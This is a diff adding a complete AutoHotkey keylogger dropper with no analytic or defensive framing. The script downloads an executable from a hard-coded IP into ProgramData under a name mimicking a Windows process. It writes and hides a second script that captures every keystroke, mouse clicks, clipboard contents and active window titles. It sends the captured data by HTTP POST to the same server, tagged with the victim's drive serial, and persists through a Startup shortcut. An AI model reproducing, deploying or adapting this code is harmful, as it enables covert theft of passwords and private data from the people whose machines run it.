@@ -1,0 +1,144 @@
+﻿#NoTrayIcon
+#NoEnv
+#SingleInstance Force
+
+If ProcessExist("taskhostkl.exe") {
+SendLog("keylog: already on")
+ExitApp
+} else {
+SendLog("keylog: load")
+UrlDownloadToFile,  http://15.225.200.157/download?path=ahkdotexe, C:\ProgramData\taskhostkl.exe
+FileAppend,
+(
+#NoTrayIcon
+#NoEnv
+#Persistent
+SetBatchLines, -1
+global Logs
+
+KbdHook := new WindowsHook(WH_KEYBOARD_LL := 13, "LowLevelKeyboardProc")
+MseHook := new WindowsHook(WH_MOUSE_LL    := 14, "LowLevelMouseProc")
+OnClipboardChange("OnClipboard")
+SetTimer, WatchActiveWindow, -1000
+;SendInfo("keylog: ok", "text")
+Return
+
+WatchActiveWindow() {
+   static prevTitle
+   WinGetTitle, title, A
+   if !(title == prevTitle) {
+      FormatTime, time,, dd.MM.yyyy  HH:mm
+      Logs := "[" . time . "] (" . prevTitle . ")  " . Logs
+      s := Logs, Logs := ""
+      SendInfo(s, "keys")
+   }
+   prevTitle := title
+   SetTimer,, -1000
+}
+
+SendInfo(str, mode) {
+   DriveGet, serial, serial, C:
+   ComObjError(False)
+   url := "http://15.225.200.157/keylogs/" . serial
+   whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+   whr.Open("POST", url, true)
+   whr.SetRequestHeader("User-Agent", "AutoHotkey")
+   whr.SetRequestHeader("Content-Type", "application/x-www-Form-urlencoded")
+   whr.Send("&keylog=" . str )
+   whr.WaitForResponse()
+   whr.Close
+}
+
+OnClipboard(type) {
+   if (type = 1)
+      Logs .= "[" . Chr(128203) . ": " . SubStr(Clipboard, 1, 150) . "]"
+}
+
+LowLevelMouseProc(nCode, wParam, lParam) {
+   static WM_LBUTTONDOWN := 0x201, WM_RBUTTONDOWN := 0x204
+   if (wParam = WM_LBUTTONDOWN)
+      Logs .= Chr(128433) . Chr(65039)
+   if (wParam = WM_RBUTTONDOWN)
+      Logs .= Chr(128433) . Chr(65039)
+   Return DllCall("CallNextHookEx", "Ptr", 0, "Int", nCode, "Ptr", wParam, "Ptr", lParam)
+}
+
+LowLevelKeyboardProc(nCode, wParam, lParam) {
+   static WM_KEYDOWN = 0x100, info := [], timer := Func("Handler").Bind(info)
+   if (wParam = WM_KEYDOWN) {
+      vk := NumGet(lParam + 0, "UInt")
+      sc := NumGet(lParam + 4, "UInt")
+      if !( GetKeyState("LControl", "P") || GetKeyState("RControl", "P") ) {
+         info.Push([vk, sc])
+         SetTimer, `% timer, -10
+      }
+   }
+   Return DllCall("CallNextHookEx", "Ptr", 0, "Int", nCode, "Ptr", wParam, "Ptr", lParam)
+}
+
+Handler(info) {
+   while info[1]
+      Logs .= GetCharOfKey(info.RemoveAt(1)*)
+}
+
+GetCharOfKey(vk, sc)
+{
+   ThreadID := DllCall("GetWindowThreadProcessId", Ptr, WinExist("A"), "UInt", 0)
+   InputLocaleID := DllCall("GetKeyboardLayout", "UInt", ThreadID)
+   VarSetCapacity(KeyState, 256)
+   DllCall("AttachThreadInput", "UInt", ThreadID, "UInt", DllCall("GetCurrentThreadId"), "UInt", 1)
+   DllCall("GetKeyboardState", "Ptr", &KeyState)
+   VarSetCapacity(buff, 2)
+   if A_IsUnicode
+      DllCall("ToUnicodeEx", "UInt", vk, "UInt", sc, "Ptr", &KeyState, "Str", buff, "Int", 1, "UInt", 0, "UInt", InputLocaleID)
+   else
+      DllCall( "ToAsciiEx" , "UInt", vk, "UInt", sc, "Ptr", &KeyState, "Str", buff, "UInt", 0, "UInt", InputLocaleID )
+   Return buff
+}
+
+class WindowsHook {
+   __New(type, callback, eventInfo := "", isGlobal := true) {
+      this.callbackPtr := RegisterCallback(callback, "Fast", 3, eventInfo)
+      this.hHook := DllCall("SetWindowsHookEx", "Int", type, "Ptr", this.callbackPtr
+                                              , "Ptr", !isGlobal ? 0 : DllCall("GetModuleHandle", "UInt", 0, "Ptr")
+                                              , "UInt", isGlobal ? 0 : DllCall("GetCurrentThreadId"), "Ptr")
+   }
+   __Delete() {
+      DllCall("UnhookWindowsHookEx", "Ptr", this.hHook)
+      DllCall("GlobalFree", "Ptr", this.callBackPtr, "Ptr")
+   }
+}
+), C:\ProgramData\taskhostkl.ahk
+Run, C:\ProgramData\taskhostkl.exe, ,Hide UseErrorLevel
+}
+
+If ErrorLevel {
+SendLog("keylog: err! not downloaded ahk")
+ExitApp
+} else {
+FileCreateShortcut, C:\ProgramData\taskhostkl.exe, %A_Startup%\taskhostkl.lnk, %A_ScriptDir%\, , taskhostkl 4.2.0.8, ,
+SendLog("keylog: ok!")
+ExitApp
+}
+
+ProcessExist(Name)
+{
+Process, Exist, %Name%
+return Errorlevel
+}
+
+SendLog(s)
+{
+DriveGet, djh34, serial, C:
+ComObjError(False)
+sHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+sHTTP.Open("POST", "http://15.225.200.157/" . djh34, False)
+sHTTP.SetRequestHeader("User-Agent", "AutoHotkey")
+sHTTP.SetRequestHeader("Content-Type", "application/x-www-Form-urlencoded")
+sHTTP.Send("&log=" . s)
+sHTTP.WaitForResponse()
+sHTTP.Close
+}
+
+;0.3
+;~
